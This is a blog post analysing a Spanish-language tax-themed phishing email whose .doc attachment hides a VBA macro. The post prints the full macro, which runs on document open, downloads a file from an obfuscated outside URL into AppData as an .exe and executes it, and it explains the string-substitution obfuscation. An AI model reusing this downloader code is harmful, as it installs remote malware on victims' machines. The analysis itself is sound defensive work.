---
layout: post
title: Malware Analysis SAT_Documento778288
---

Today I want to post a real malware analysis which I've done in my actual company. A project manager contacted with me and sent me a suspicious email which seems to be a tipical phising attack. For people who doesn't speak spanish, the body of the email blame us of tax evasion:

![evidence1]({{ site.baseurl }}/images/mlwr_satdocumento01.png)

In the email, the sender appended a doc file attachment with the name "SAT_Documento778288.doc". At first glance, VirusTotal report to us a Macro-based malware, probably written in VBA (Visual Basic for Application). It is interesting to observe how any of the most important AV solutions don't detect the malicious code:

![evidence2]({{ site.baseurl }}/images/mlwr_satdocumento02.png)

Analyzing the code, you can see how effectively it is a document that hides a macro written in VBA.
```
Dim JKlWp6gFNDD5rvrAaEWp8W27 As String

Private Declare Function URLDownloadToFileW Lib "urlmon.dll" (ByVal wT2uFiYs90CvHobTzNKS8krV4I2JU2 As Long, ByVal wT2uFiYs90CvHobTzNKS8krV4I2JU3 As Long, ByVal wT2uFiYs90CvHobTzNKS8krV4I2JU4 As Long, ByVal wT2uFiYs90CvHobTzNKS8krV4I2JU5 As Long, ByVal wT2uFiYs90CvHobTzNKS8krV4I2JU6 As Long) As Long

Private Declare Function ShellExecuteW Lib "shell32.dll" (ByVal M4V4Jbr3 As Long, ByVal JR1QH1m3B3wHSV1D4y7rR As Long, ByVal ocMZjvRbAhK3jMRay8ku5p83pjT0En As Long, ByVal x0UTO3sI0mjsE As Long, ByVal wT2uFiYs90CvHobTzNKS8krV4I2JU0 As Long, ByVal wT2uFiYs90CvHobTzNKS8krV4I2JU1 As Long) As Long

Dim izg2Z6fBgnmpW5474FUgMYhoGVu As String

Sub Auto_Open()
Call m8g3C1uuV5DsKrkV1kA2PzVP0
End Sub


Private Function wT2uFiYs90CvHobTzNKS8krV4I2JU() As Variant

''''''

izg2Z6fBgnmpW5474FUgMYhoGVu = "httYG3V6R2l0eKchtIFTVQ5985ps://site.sitYG3V6R2l0eKchtIFTVQ5985ez3.com/soYG3V6R2l0eKchtIFTVQ5985und.YG3V6R2l0eKchtIFTVQ5985mp3YG3V6R2l0eKchtIFTVQ5985"

k = URLDownloadToFileW(0&, StrPtr(Replace(izg2Z6fBgnmpW5474FUgMYhoGVu, "YG3V6R2l0eKchtIFTVQ5985", "")), StrPtr(JKlWp6gFNDD5rvrAaEWp8W27), 0&, 0&)

wT2uFiYs90CvHobTzNKS8krV4I2JU7
''''''

End Function

Private Function m8g3C1uuV5DsKrkV1kA2PzVP0() As Long

JKlWp6gFNDD5rvrAaEWp8W27 = Environ("ap" & "pdata") & "\ggg1" & "IOLHnI060NyHiu.exe"

Call wT2uFiYs90CvHobTzNKS8krV4I2JU

End Function

Sub AutoOpen()
Call m8g3C1uuV5DsKrkV1kA2PzVP0
End Sub

Private Sub wT2uFiYs90CvHobTzNKS8krV4I2JU7()
Application.DisplayAlerts = False

ShellExecuteW 0&, StrPtr("Open"), StrPtr(JKlWp6gFNDD5rvrAaEWp8W27), StrPtr(""), StrPtr(""), 1

Application.Quit
End Sub

Sub Workbook_Open()
Call m8g3C1uuV5DsKrkV1kA2PzVP0
End Sub
```
Although it has some techniques of obfuscation implemented, its evasion was simple and in the majority of cases they refer to substitutions of long strings. For example, as it's shown before, the string "YG3V6R2l0eKchtIFTVQ5985" is replaced with "".
